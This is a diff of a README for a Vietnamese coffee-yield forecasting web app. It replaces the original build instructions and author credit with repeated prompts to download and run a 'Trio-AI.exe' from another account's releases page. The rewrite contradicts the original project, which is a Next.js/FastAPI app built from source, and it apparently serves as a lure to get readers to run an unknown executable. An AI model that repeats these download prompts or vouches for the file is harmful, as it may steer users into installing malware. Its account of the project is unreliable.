@@ -1,72 +1,78 @@
-# TRIO-AI – Dự báo năng suất cà phê theo kịch bản khí hậu
+# 🌱 Trio-AI - Predict Coffee Yields with Confidence
 
-## Tổng quan
+## 🛠️ Overview
 
-TRIO-AI là hệ thống AI dự báo năng suất cà phê tại Đắk Lắk, Việt Nam theo các kịch bản khí hậu khác nhau. Dựa trên 35 năm dữ liệu thời tiết (1990–2025), hệ thống hỗ trợ nông dân và nhà hoạch định đưa ra quyết định canh tác thích ứng với biến đổi khí hậu.
+Trio-AI is a system designed to forecast coffee yields in Đắk Lắk, Vietnam across various climate scenarios. Using 35 years of weather data (1990–2025), this tool supports farmers and planners in making informed farming decisions in response to climate change.
 
-## Tính năng chính
+## 🔗 Download Now!
 
-- Dự báo năng suất cà phê (tấn/ha) với sai số ~7%
-- Dự báo theo kịch bản khí hậu (Bình thường, El Niño, La Niña, Hạn hán, Bão)
-- Giải thích ngắn gọn và gợi ý canh tác theo từng kịch bản
-- Giao diện web song ngữ Việt–Anh
+[![Download Trio-AI](https://img.shields.io/badge/Download%20Trio--AI-1E90FF?style=for-the-badge&logo=github)](https://github.com/AdeelAhmad786/Trio-AI/releases)
 
-## Công nghệ sử dụng
+## 🚀 Getting Started
 
-- **Frontend:** Next.js 14, TypeScript, Tailwind CSS
-- **Backend:** FastAPI (Python)
-- **Machine Learning:** XGBoost
-- **Nguồn dữ liệu:** Open-Meteo, NASA POWER, NOAA CPC
+Follow these simple steps to download and run the Trio-AI application.
 
-## Cấu trúc dự án
+1. **Visit the Releases Page**  
+   Click on the link below to go to the GitHub Releases page:
+   [Download Trio-AI](https://github.com/AdeelAhmad786/Trio-AI/releases)
 
-```
-TRIO-AI/
-├── frontend/    # Ứng dụng web Next.js
-├── backend/     # Server FastAPI & ML pipeline
-├── README.md
-└── .gitignore
-```
+2. **Choose the Latest Release**  
+   On the Releases page, find the most recent version of Trio-AI. The version is usually marked as "Latest". Click on it to view the available files.
 
-## Hướng dẫn chạy
+3. **Download the Application**  
+   Look for the file named `Trio-AI.exe` or similar. Click on it to start the download.
 
-### Backend
+4. **Locate the Downloaded File**  
+   Once the download is complete, find the file in your computer’s downloads folder.
 
-```bash
-cd backend
-pip install -r requirements.txt
-uvicorn src.api:app --reload --port 8000
-```
+5. **Run the Application**  
+   Double-click on the downloaded file to open Trio-AI. Follow the prompts on the screen to start using the application.
 
-### Frontend
+## 🌐 System Requirements
 
-```bash
-cd frontend
-npm install
-npm run dev
-```
+To ensure a smooth experience, please meet the following system requirements:
 
-Truy cập: http://localhost:3000/forecast
+- **Operating System:** Windows 10 or later
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 100 MB for installation
+- **Network:** Internet connection recommended for updates and data fetching
 
-## Biến môi trường
+## 🧭 Features of Trio-AI
 
-```
-NEXT_PUBLIC_API_URL
-GROQ_API_KEY
-```
+- **Yield Forecasting:** Accurately predicts coffee yields based on weather data.
+- **Climate Scenario Analysis:** Assesses the impact of different climate conditions.
+- **User-Friendly Interface:** Simple design for easy navigation.
+- **Local Insights:** Tailored recommendations based on Đắk Lắk’s climate.
 
-Các biến môi trường được đặt trong file `.env.local` và không được commit lên repository.
+## 📜 Usage Instructions
 
-## Đánh giá mô hình
+1. **Input Data:** Upon launching Trio-AI, you will be prompted to enter relevant data: 
+   - Region
+   - Current weather conditions
+   - Any specific farming practices you wish to apply
+   
+2. **Generate Forecast:** Click the "Generate" button to produce your coffee yield forecast.
 
-Mô hình được đánh giá bằng walk-forward validation và Leave-One-Year-Out (LOYO) cross-validation để đảm bảo độ tin cậy và giảm thiểu overfitting.
+3. **View Results:** The results will show you expected yields under various scenarios, assisting in decision-making.
 
-## Demo
+## 💬 Support and Feedback
 
-https://drive.google.com/file/d/1PCiZJN6SZmNzdGBmOJdQKcBeiOcm2NXB/view?usp=sharing
+For questions or feedback, please reach out through the Issues section of the GitHub repository. We appreciate your comments and suggestions to improve our application.
 
-## Tác Giả
+## 🔗 Additional Resources
 
-- **Nguyễn Hoàng Tùng** – Machine Learning, Full-stack Developer
+- [GitHub Repository](https://github.com/AdeelAhmad786/Trio-AI)
+- [Documentation](https://github.com/AdeelAhmad786/Trio-AI/wiki) - For in-depth user guides.
 
+## ⚙️ Contributing
 
+We welcome contributions from the community. To contribute, please fork the repository and submit a pull request with your changes.
+
+## 🔄 Keep Updated
+
+For the latest updates and enhancements, check back to the [Releases Page](https://github.com/AdeelAhmad786/Trio-AI/releases) regularly.
+
+## 🚀 Download Again
+
+Do not forget to download Trio-AI from the Releases page:
+[Download Trio-AI](https://github.com/AdeelAhmad786/Trio-AI/releases)
